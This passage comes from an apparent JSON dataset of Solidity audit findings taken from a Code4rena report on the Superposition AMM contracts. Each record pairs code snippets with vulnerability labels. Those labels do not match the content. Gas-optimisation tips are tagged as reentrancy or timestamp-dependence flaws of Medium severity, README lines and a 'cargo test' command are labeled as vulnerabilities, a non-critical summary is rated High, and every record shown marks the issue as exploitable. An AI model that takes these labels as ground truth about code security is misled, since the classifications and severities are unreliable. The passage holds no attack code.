    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n30: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n79:         ISeawaterExecutorFallback _executorFallback\n\n89:             _executorFallback\n\n122:         ISeawaterExecutorFallback executorFallback\n\n124:         _setProxies(executorSwap, executorSwapPermit2, executorQuote, executorPosition, executorUpdatePosition, executorAdmin, executorFallback);\n\n505:     fallback() external {\n\n520:         else directDelegate(_getExecutorFallback());\n\n545:     function _getExecutorFallback() internal view returns (address) {\n\n546:         return StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value;\n\n560:         ISeawaterExecutorFallback executorFallback\n\n568:         StorageSlot.getAddressSlot(EXECUTOR_FALLBACK_SLOT).value = address(executorFallback);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] Fallback lacking `payable`",
    "description": "*Instances (11)*: File: ./pkg/sol/SeawaterAMM.sol 30: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1); 79:         ISeawaterExecutorFallback _executorFallback 89:             _executorFallback",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.852,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n182:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {\n             return TOKEN_URI;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] NFT ownership doesn't support hard forks",
    "description": "To ensure clarity regarding the ownership of the NFT on a specific chain, it is recommended to add `require(block.chainid == 1, \"Invalid Chain\")` or the desired chain ID in the functions below. Alternatively, consider including the chain ID in the URI itself. By doing so, any confusion regarding the chain responsible for owning the NFT will be eliminated. *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 182:     function tokenURI(uint256 /* _tokenId */) external view returns (string memory) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.167,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n[Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"L-3\"></a>[L-3] Solidity version 0.8.20+ may not work on other chains due to `PUSH0`",
    "description": "The compiler for Solidity 0.8.20 switches the default target EVM version to [Shanghai](https://blog.soliditylang.org/2023/05/10/solidity-0.8.20-release-announcement/#important-note), which includes the new `PUSH0` op code. This op code may not yet be implemented on all L2s, so deployment on these chains will fail. To work around this issue, use an earlier [EVM](https://docs.soliditylang.org/en/v0.8.20/using-the-compiler.html?ref=zaryabs.com#setting-the-evm-version-to-target) [version](https://book.getfoundry.sh/reference/config/solidity-compiler#evm_version). While the project itself may or may not compile with 0.8.20, other projects with which it integrates, or which extend this project may, and those projects will have problems deploying these contracts/libraries. *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 2: pragma solidity 0.8.16; [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.108,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n405:     function feesOwed22F28DBD(\n             address /* pool */,\n             uint256 /* position */\n         ) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n405:     function feesOwed22F28DBD(\n             address /* pool */,\n             uint256 /* position */\n         ) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Fees can be set to be greater than 100%.",
    "description": "There should be an upper limit to reasonable fees. A malicious owner can keep the fee rate at zero, but if a large value transfer enters the mempool, the owner can jack the rate up to the maximum and sandwich attack a user. *Instances (8)*: File: ./pkg/sol/SeawaterAMM.sol 405:     function feesOwed22F28DBD(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 34,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n115:     function updateExecutors(\n\n160:     function createPoolD650E2D0(\n\n171:     function collectProtocol7540FA9F(\n\n181:     function enablePool579DA658(\n\n189:     function authoriseEnabler5B17C274(\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n214:     function swap904369BE(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external returns (int256, int256) {\n\n219:     function quote72E2ADE7(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external {\n\n225:     function quote2CD06B86E(address /* to */, address /* from */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n230:     function swapPermit2EE84AD91(\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n249:     function swap2ExactInPermit236B2FDD8(\n\n262:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n281:     function swapInPermit2CEAAB576(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n304:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n322:     function swapOutPermit23273373B(address token, uint256 amountIn, uint256 minOut, uint256 nonce, uint256 deadline, uint256 maxAmount, bytes memory sig) external returns (int256, int256) {\n\n346:     function mintPositionBC5B086D(address /* token */, int32 /* lower */, int32 /* upper */) external returns (uint256 /* id */) {\n\n351:     function burnPositionAE401070(uint256 /* id */) external {\n\n356:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n362:     function transferPositionEEC7A3CD(\n\n371:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n376:     function positionLiquidity8D11C045(\n\n384:     function positionTickLower2F77CCE1(\n\n392:     function positionTickUpper67FD55BA(\n\n400:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n405:     function feesOwed22F28DBD(\n\n413:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n418:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n438:     function collectSingleTo6D76575F(\n\n447:     function collect7F21947C(\n\n455:     function updatePositionC7F1F740(\n\n464:     function incrPositionC3AC7CAA(\n\n476:     function decrPosition09293696(\n\n487:     function incrPositionPermit25468326E(\n\n505:     fallback() external {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-2\"></a>[M-2] Library function isn't `internal` or `private`",
    "description": "In a library, using an external or public visibility means that we won't be going through the library with a DELEGATECALL but with a CALL. This changes the context and should be done carefully. *Instances (41)*: File: ./pkg/sol/SeawaterAMM.sol 104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { 115:     function updateExecutors(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 86,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2024-08-superposition/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ * It is possible for someone to grief the protocol by creating a pool with bad configuration. * It is possible for the permissioned account to do things to grief the protocol.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " are issues that cropped up in production that we isolated by reproducing the remote state into our contracts. the production contract was deployed at one point with a change from the current version of this code that we believe may have contributed to causing this to happen.\n2. ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Running tests",
    "description": "See [pkg/README](https://github.com/code-423n4/2024-08-superposition/blob/main/pkg/README.md#building) for a detailed explanation Then run the following command: https://github.com/code-423n4/2024-08-superposition cd 2024-08-superposition/pkg rustup target add wasm32-unknown-unknown",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.28,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "cargo test\n--features=testing,testing-dbg-erc20 -- --nocapture",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Cargo test tracing",
    "description": "Some of the cargo tests have optional logging, which might help with debugging. To see these logs, enable the `testing-dbg-<test>` feature and run the tests without capturing stdout, ie `cargo test --features=testing,testing-dbg-erc20 -- --nocapture`. Testing tools are available with the `with_storage` macro, which lets you set slots and",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n36:     mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-1\"></a>[GAS-1] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 36:     mapping(address => mapping(address => bool)) public isApprovedForAll; [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.123,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n4: import \"./ISeawaterExecutors.sol\";\n\n6: import \"./ISeawaterAMM.sol\";\n\n12: bytes32 constant EXECUTOR_SWAP_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap\")) - 1);\n\n15: bytes32 constant EXECUTOR_SWAP_PERMIT2_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap_permit2\")) - 1);\n\n18: bytes32 constant EXECUTOR_QUOTE_SLOT = bytes32(uint256(keccak256(\"seawater.impl.quote\")) - 1);\n\n21: bytes32 constant EXECUTOR_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.position\")) - 1);\n\n24: bytes32 constant EXECUTOR_UPDATE_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.update_position\")) - 1);\n\n27: bytes32 constant EXECUTOR_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.impl.admin\")) - 1);\n\n30: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n33: bytes32 constant PROXY_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.role.proxy.admin\")) - 1);\n\n161:         address /* token */,\n\n162:         uint256 /* sqrtPriceX96 */,\n\n163:         uint32 /* fee */,\n\n164:         uint8 /* tickSpacing */,\n\n165:         uint128 /* maxLiquidityPerTick */\n\n172:         address /* pool */,\n\n173:         uint128 /* amount0 */,\n\n174:         uint128 /* amount1 */,\n\n175:         address /* recipient */\n\n182:         address /* pool */,\n\n183:         bool /* enabled */\n\n190:         address /* enabler */,\n\n191:         bool /* enabled */\n\n197:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n202:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n207:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n214:     function swap904369BE(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external returns (int256, int256) {\n\n219:     function quote72E2ADE7(address /* pool */, bool /* zeroForOne */, int256 /* amount */, uint256 /* priceLimit */) external {\n\n225:     function quote2CD06B86E(address /* to */, address /* from */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n231:         address /* pool */,\n\n232:         bool /* zeroForOne */,\n\n233:         int256 /* amount */,\n\n234:         uint256 /* priceLimit */,\n\n235:         uint256 /* nonce */,\n\n236:         uint256 /* deadline */,\n\n237:         uint256 /* maxAmount */,\n\n238:         bytes memory /* sig */\n\n244:     function swap2ExactIn41203F1D(address /* tokenA */, address /* tokenB */, uint256 /* amountIn */, uint256 /* minAmountOut */) external returns (uint256, uint256) {\n\n250:         address /* from */,\n\n251:         address /* to */,\n\n252:         uint256 /* amount */,\n\n253:         uint256 /* minOut */,\n\n254:         uint256 /* nonce */,\n\n255:         uint256 /* deadline */,\n\n256:         bytes memory /* sig */\n\n276:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n299:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n346:     function mintPositionBC5B086D(address /* token */, int32 /* lower */, int32 /* upper */) external returns (uint256 /* id */) {\n\n351:     function burnPositionAE401070(uint256 /* id */) external {\n\n356:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n363:         uint256 /* id */,\n\n364:         address /* from */,\n\n365:         address /* to */\n\n371:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n377:         address /* pool */,\n\n378:         uint256 /* id */\n\n385:         address /* pool */,\n\n386:         uint256 /* id */\n\n393:         address /* pool */,\n\n394:         uint256 /* id */\n\n400:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n406:         address /* pool */,\n\n407:         uint256 /* position */\n\n413:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n418:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n423:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n428:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n433:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n439:         address /* pool */,\n\n440:         uint256 /* id */,\n\n441:         address /* recipient */\n\n448:         address[] memory /* pools */,\n\n449:         uint256[] memory /* ids */\n\n456:         address /* pool */,\n\n457:         uint256 /* id */,\n\n458:         int128 /* delta */\n\n465:         address /* pool */,\n\n466:         uint256 /* id */,\n\n467:         uint256 /* amount0Min */,\n\n468:         uint256 /* amount1Min */,\n\n469:         uint256 /* amount0Desired */,\n\n470:         uint256 /* amount1Desired */\n\n477:         uint256 /* id */,\n\n478:         uint256 /* amount0Min */,\n\n479:         uint256 /* amount1Min */,\n\n480:         uint256 /* amount0Max */,\n\n481:         uint256 /* amount1Max */\n\n488:         address /* token */,\n\n489:         uint256 /* id */,\n\n490:         uint256 /* amount0Min */,\n\n491:         uint256 /* amount1Min */,\n\n492:         uint256 /* nonce0 */,\n\n493:         uint256 /* deadline0 */,\n\n494:         uint256 /* amount0Max */,\n\n495:         bytes memory /* sig0 */,\n\n496:         uint256 /* nonce1 */,\n\n497:         uint256 /* deadline1 */,\n\n498:         uint256 /* amount1Max */,\n\n499:         bytes memory /* sig1 */\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-3\"></a>[GAS-3] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (105)*: File: ./pkg/sol/OwnershipNFTs.sol 4: import \"./IERC721Metadata.sol\"; 5: import \"./ISeawaterAMM.sol\"; 7: import \"./IERC721TokenReceiver.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 202,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n276:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n299:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n317:         require(swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n339:         require(swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "<a name=\"GAS-4\"></a>[GAS-4] Use Custom Errors instead of Revert Strings to save Gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries). Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Consider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.364,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n92:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall(abi.encodeCall(\n\n263:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(abi.encodeCall(\n\n282:         (bool success, bytes memory data) = _getExecutorSwapPermit2().delegatecall(abi.encodeCall(\n\n305:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(abi.encodeCall(\n\n323:         (bool success, bytes memory data) = _getExecutorSwapPermit2().delegatecall(abi.encodeCall(\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Avoid contract existence checks by using low level calls",
    "description": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence *Instances (5)*: File: ./pkg/sol/SeawaterAMM.sol 92:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall(abi.encodeCall( 263:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(abi.encodeCall(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.546,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-7\"></a>[GAS-7] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (1)*: File: ./pkg/sol/SeawaterAMM.sol 104:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/SeawaterAMM.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.12,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 2 | | [NC-2](#NC-2) | Array indices should be referenced via `enum`s rather than via numeric literals | 7 | | [NC-3](#NC-3) | `constant`s should be defined rather than using magic numbers | 5 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n509:         if (uint8(msg.data[2]) == 0) directDelegate(_getExecutorSwap());\n\n511:         else if (uint8(msg.data[2]) == 1) directDelegate(_getExecutorUpdatePosition());\n\n513:         else if (uint8(msg.data[2]) == 2) directDelegate(_getExecutorPosition());\n\n515:         else if (uint8(msg.data[2]) == 3) directDelegate(_getExecutorAdmin());\n\n517:         else if (uint8(msg.data[2]) == 4) directDelegate(_getExecutorSwapPermit2());\n\n519:         else if (uint8(msg.data[2]) == 5) directDelegate(_getExecutorQuote());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-4\"></a>[NC-4] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (7)*: File: ./pkg/sol/OwnershipNFTs.sol 80:         if (_to.code.length == 0) return; [Link to code](https://github.com/code-423n4/2024-08-superposition/tree/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.564,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   internal getAddressSlot\n   public updateProxyAdmin\n   public updateExecutors\n   internal directDelegate\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactIn41203F1D\n   external swap2ExactInPermit236B2FDD8\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external burnPositionAE401070\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionC3AC7CAA\n   external decrPosition09293696\n   external incrPositionPermit25468326E\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n   \n   Suggested order:\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactIn41203F1D\n   external swap2ExactInPermit236B2FDD8\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external burnPositionAE401070\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionC3AC7CAA\n   external decrPosition09293696\n   external incrPositionPermit25468326E\n   public updateProxyAdmin\n   public updateExecutors\n   internal getAddressSlot\n   internal directDelegate\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2\n   internal _getExecutorQuote\n   